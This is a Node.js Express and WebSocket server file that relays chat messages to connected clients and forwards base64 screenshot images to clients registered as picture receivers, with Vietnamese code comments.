const http = require("http");
const express = require("express");
const WebSocket = require("ws");
const app = express();

app.use(express.static("public"));

const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocket.Server({ 
    noServer: true,
    maxPayload: 50 * 1024 * 1024, // Giới hạn kích thước tin nhắn (ví dụ: 50MB)
});

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

const usersInChat = new Map();
const pictureReceivers = new Map(); 
let keepAliveId;

wss.on("connection", function (ws) {
    const userID = generateUniqueID();
    
    ws.on("message", data => {
        try {
            handleMessage(ws, data, userID);
        } catch (error) {
            console.error('Error handling message:', error);
            safeWebSocketSend(ws, JSON.stringify({
                type: 'error',
                message: 'Invalid message format'
            }));
        }
    });

    ws.on("close", () => {
        try {
            handleDisconnect(userID);
            ws.removeAllListeners();
        } catch (error) {
            console.error('Error handling disconnect:', error);
        }
    });

    ws.on("error", (error) => {
        console.error('WebSocket error:', error);
        try {
            handleDisconnect(userID);
        } catch (innerError) {
            console.error('Error during error handling:', innerError);
        }
    });

    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }
});

wss.on("close", () => {
    clearInterval(keepAliveId);
    keepAliveId = null;
});

function generateUniqueID() {
    return Math.random().toString(36).substr(2, 9);
}

function handleMessage(ws, data, userID) {
    let messageData;
    try {
        // Thử chuyển đổi dữ liệu thành chuỗi UTF-8
        const messageString = data.toString('utf8');
        
        // Kiểm tra xem chuỗi có phải là UTF-8 hợp lệ không
        if (!isValidUTF8(messageString)) {
            throw new Error('Invalid UTF-8 sequence');
        }
        
        messageData = JSON.parse(messageString);
    } catch (error) {
        console.error('Error parsing message:', error);
        safeWebSocketSend(ws, JSON.stringify({
            type: 'error',
            message: 'Invalid message format'
        }));
        return;
    }

    if (messageData.command === 'Picture Receiver') {
        pictureReceivers.set(userID, ws);
    } else if (messageData.type === 'screenshot' && messageData.data.startsWith('data:image/png;base64')) {
        broadcastToPictureReceivers({
            type: 'screenshot',
            action: messageData.action,
            screen: messageData.screen,
            data: messageData.data
        });
    } else if (messageData.action === 'screenshot_result') {
        broadcastToPictureReceivers({
            type: 'screenshot',
            action: messageData.action,
            screen: messageData.screen,
            data: messageData.data
        });
    } else {
        broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
    }
}

function isValidUTF8(str) {
    try {
        return Buffer.from(str, 'utf8').toString('utf8') === str;
    } catch (e) {
        return false;
    }
}

function safeWebSocketSend(ws, message) {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(message, (error) => {
            if (error) console.error('Error sending message:', error);
        });
    }
}

function broadcastToPictureReceivers(message) {
    const data = JSON.stringify(message);
    pictureReceivers.forEach((ws, userId) => {
        safeWebSocketSend(ws, data);
    });
}

function broadcastToAllExceptPictureReceivers(senderWs, message, includeSelf) {
    wss.clients.forEach(client => {
        if (!pictureReceivers.has(client) && (includeSelf || client !== senderWs)) {
            safeWebSocketSend(client, message);
        }
    });
}

function handleDisconnect(userID) {
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
}

function keepServerAlive() {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping(null, false, (error) => {
                    if (error) console.error('Ping error:', error);
                }); 
            }
        });
    }, 30000);
}
